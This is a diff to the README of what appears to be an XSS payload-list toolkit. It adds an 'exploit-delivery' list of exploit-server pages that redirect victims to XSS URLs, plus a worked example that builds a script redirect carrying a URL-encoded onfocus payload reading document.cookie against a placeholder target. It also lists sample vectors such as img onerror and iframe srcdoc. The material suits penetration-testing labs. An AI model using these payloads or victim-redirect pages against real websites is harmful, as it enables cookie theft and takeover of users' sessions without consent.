@@ -18,6 +18,7 @@ New/targeted lists:
 - iframe-srcdoc.txt: `srcdoc`-based auto-exec vectors.
 - canonical-link-attr.txt: Attribute injection patterns for `<link rel="canonical">` with accesskey/onclick.
  - xsshunter-inspired.txt: High-ROI XSShunter-style payloads (base64-in-attr loaders, jquery getScript, svg onload, input autofocus).
+ - exploit-delivery.txt: Minimal exploit-server pages/snippets to navigate victims to final XSS URLs (script/location/meta refresh/data URL/auto-click variants). Use placeholders `{{TARGET_URL}}`, `{{PARAM}}`, `{{ENC_PAYLOAD}}`, `{{FRAGMENT}}`.
 
 Usage suggestions:
 - Start with `tags-probe.txt` to see which tags are blocked.
@@ -25,11 +26,22 @@ Usage suggestions:
 - Use `tags-events-payloads-core.txt` for broad, interactive coverage.
 - Combine `tags-probe.txt` + `events.txt` + `payloads.txt` to generate full lists if needed.
   - For attribute URL contexts, also combine with `javascript-url-payloads.txt`.
+  - When exploitation requires redirecting a victim from an exploit server, use `exploit-delivery.txt` to generate a minimal redirect/auto-navigation page.
 
 Examples:
 - `<body =1>`
 - `<img src=x onerror=prompt(1)>`
 - `<iframe srcdoc="<script>prompt(1)</script>"></iframe>`
+
+Exploit-server delivery example:
+- Goal: reflect a custom-tag focus payload and auto-focus with a fragment.
+- Template (from `exploit-delivery.txt`): `<script>location='{{TARGET_URL}}?{{PARAM}}={{ENC_PAYLOAD}}{{FRAGMENT}}'</script>`
+- Fill-ins:
+  - `{{TARGET_URL}}` = `https://TARGET/`
+  - `{{PARAM}}` = `search`
+  - `{{ENC_PAYLOAD}}` = `%3Cxss%20id%3Dx%20tabindex%3D1%20onfocus%3Dalert(document.cookie)%3E`
+  - `{{FRAGMENT}}` = `#x`
+  - Resulting page navigates to: `https://TARGET/?search=%3Cxss%20id%3Dx%20tabindex%3D1%20onfocus%3Dalert(document.cookie)%3E#x`
 
 Context-to-list mapping quick reference:
 - HTML text → `tags-probe.txt`, `tags-events-payloads-core.txt`, `js-autoexec.txt`.
